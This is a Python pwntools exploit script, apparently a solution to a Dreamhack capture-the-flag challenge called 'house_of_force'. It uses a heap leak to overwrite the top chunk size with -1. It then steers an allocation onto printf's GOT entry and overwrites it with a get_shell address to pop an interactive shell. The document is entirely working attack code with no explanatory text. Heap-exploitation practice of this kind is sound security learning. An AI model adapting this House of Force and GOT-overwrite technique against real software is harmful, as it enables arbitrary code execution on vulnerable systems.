from pwn import *

p = process('./house_of_force')
# p = remote("host3.dreamhack.games",15460)
e = ELF('./house_of_force')

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)
    
    
def write(idx, w_idx, value):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'idx: ', str(w_idx).encode())
    p.sendlineafter(b'value: ', str(value).encode())

def end():
    p.sendlineafter(b'> ', b'3')

context.binary = e
context.log_level = 'debug'


create(0x8, b'a'*0x8)

heap_leak = int(p.recvuntil(b':')[:-1],16)
top_chunk_addr = heap_leak + 0x8
print(f'Heap leak: {hex(heap_leak)}')
print(f'Top chunk address: {hex(top_chunk_addr)}')
# pause()

# 32bit = -0x8
# 64bit = -0x10
chunk_size = e.got.printf - top_chunk_addr - 0x8
print(f"got_printf: {hex(e.got.printf)}")
write(0, 3, -1) # top chunk size overwrite
print(f"chunk_size: {hex(chunk_size)}")

# pause()
create(chunk_size, b'a'*4)

pause()
create(0x10, p32(e.symbols.get_shell) * 4)


p.interactive()